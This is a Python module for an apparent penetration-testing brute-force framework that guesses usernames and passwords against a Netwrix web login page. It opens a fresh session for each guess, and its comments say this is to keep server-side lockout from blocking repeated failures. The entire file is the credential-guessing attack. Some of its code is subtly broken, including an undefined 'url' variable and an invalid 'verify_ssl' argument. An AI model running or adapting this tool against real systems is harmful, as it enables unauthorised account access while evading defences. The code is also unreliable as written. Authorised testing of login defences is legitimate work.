#!/usr/bin/env python3

import requests
import re
import warnings
import pdb
from bfg.args import http as http_args, argument
from bfg.shortcuts.http import HTTPModule, handleUA

warnings.filterwarnings('ignore')

# Default user agent
DEFAULT_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ' \
             'AppleWebKit/537.36 (KHTML, like Gecko) Chr' \
             'ome/58.0.3029.110 Safari/537.36'

# Path to default landing page
#   - Assigns CRSF cookie
#   - Provides value to fc POST parameter (unknown use)
DEFAULT_LANDING = '/PM/default.asp'

# Path to where the form is posted
DEFAULT_LOGIN   = '/PM/enroll_verify.asp'

@argument
def domain(name_or_flags=('--domain',),type=str, required=True,
        help='Domain value.'):
    pass

@argument
def landing_path(name_or_flags=('--landing-path',),
        default=DEFAULT_LANDING,
        help='String path to the landing page that issues '
            'cookies/tokens.'):
    pass

@argument
def login_path(name_or_flags=('--login-path',), default=DEFAULT_LOGIN,
        help='String path to where the authentication form '
            'is to be submitted.'):
    pass

class Module(HTTPModule):

    description = brief_description = 'Netwrix web login'

    args = [http_args.url(), domain(), landing_path(), login_path()] + \
            http_args.getDefaults('url', invert=True)

    contributors = [
            dict(
                name='Justin Angel [Creator]',
                additional=dict(
                    company='Black Hills Information Security',
                    twitter='@ImposterKeanu'))
        ]

    def __post_init__(self, domain, landing_path, login_path,
            *args, **kwargs):

        self.url=self.url
        self.domain=domain
        self.landing_path=landing_path
        self.login_path=login_path
        self.landing_url=f'{url}{landing_path}'
        self.auth_url=f'{url}{login_path}'

    @handleUA
    def __call__(self,username,password):
        '''Authentication module called for each set of credentials.
        It uses a fresh `requests.Session` object to acquire a new
        session cookie and fc value from the landing page to assure
        that server-side logic doesn't denylist a given combination of
        values due to multiple failed authentication attempts.

        - username - String username value to guess
        - password - String password value to guess
        '''

        # ====================
        # GET NECESSARY VALUES
        # ====================

        sess = requests.Session()

        # Get a CSRF-TOKEN (cookie)
        resp = sess.get(self.landing_url,
                headers=self.headers,
                verify_ssl=self.verify_ssl)

        if resp.status_code != 200:
            raise Exception(
                    f'Server responded with non 200: {resp.status_code}')

        # ======================
        # ATTEMPT AUTHENTICATION
        # ======================

        data={"user_name":username,"password":password,"x":0,"y":0,"domain":self.domain}

        # Encode the password
        data["user_nameU"]="FEFF;"+";".join([str(v) for v in username.encode('utf')])
        data["passwordU"]="FEFF;"+";".join([str(v) for v in password.encode('utf')])

        resp = sess.post(
                self.auth_url,
                data=data,
                verify=self.verify_ssl,
            )

        # =====================================
        # VERIFY CREDENTIALS AND RETURN OUTCOME
        # =====================================

        if resp.text.find('Logon failed') > -1:
            return dict(outcome=0, username=username, password=password)
        else:
            print(resp.text)
            return dict(outcome=1, username=username, password=password)
